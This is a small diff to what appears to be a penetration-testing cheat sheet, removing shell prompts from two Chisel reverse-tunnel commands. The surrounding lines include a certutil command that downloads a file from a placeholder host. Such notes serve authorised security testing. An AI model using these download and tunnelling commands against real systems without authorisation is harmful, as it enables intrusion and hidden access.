@@ -167,8 +167,8 @@ certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
 ```
 #### Chisel
 ```c
-$ ./chisel server -p 9002 -reverse -v
-$ ./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
+./chisel server -p 9002 -reverse -v
+./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
 ```
 #### gcc
 ```c
